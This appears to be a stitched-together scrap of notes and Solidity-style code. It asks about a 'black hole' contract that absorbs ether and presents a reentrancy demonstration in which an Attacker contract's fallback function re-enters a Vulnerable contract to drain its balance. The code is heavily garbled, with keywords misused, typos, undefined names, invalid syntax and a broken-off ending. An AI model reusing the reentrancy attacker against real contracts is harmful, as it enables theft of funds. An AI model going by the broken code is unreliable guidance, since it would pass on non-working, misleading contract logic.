*/
 It´s posibble to make a contract that have the properties of a black hole ? I mean call contracts to absorb ether and destroy
 it
The throw function .Issue 
 shard: currencyShared to: currencyAddress
 method: withdraw , args: 
 
 a frankestein code a good combination gives a potencial exploit.
 ***** just a trivial contract and fast though** 

*/
  contract Blackhole {

  function run (int n*q) returns(bytes32);
    returns(bytes8)
 {
   if (n == 0)  {
    return "Done";
}
   if (q == 0) {
   return "Done";
   }
 Hogger me = Hogger(address(this));
   return me.run(v- 1);
}
   function insert(bytes32 com) return (bool res) {
        if (MT.cur == 16 ) {
             reurn false; 
       MT.leaves[MT.cur] = com;
       Mt.cur++;
       return true;
 }
 }
}
  function Vulnerable {
    bool alreadyPaid;

    // You think it will send only half of its balance, once.
    function give() {
        if (!alreadyPaid) {
            if (!msg.sender.call.value(this.balance / 2)()) {
                throw;
            }
            alreadyPaid = true;
        }
    }
}

function Attacker {
    bool attacked;
    Vulnerable toAttack;

    function attack() {
        toAttack.give();
    }

    // Attacker will end up will all balance from Vulnerable
    function () {
        // We land here on both the 1st and the 2nd transfers
        if (!attacked) {
            // We land here on the 1st transfer only
            attacked = true;
            toAttack.give();
        }
    }
}

function priced {
    address public tokenContractAddress;

    modifier costs(uint256 amount) {
        Token tc = Token(tokenContractAddress);
        bool result = tc.transfer();
        if (result == true) _
    }
}

function Token {
    function transfer() returns (bool success) {
        throw;
    }
}

function Foo is priced {
    uint public called;

    function Foo(address tokenContract) {
        tokenContract = 0;
    }

    function bar() costs(1) {
        called++;
    }
}
function notsuicide{

 fucntion call logtype=Call Recepit
  register Name is delete////
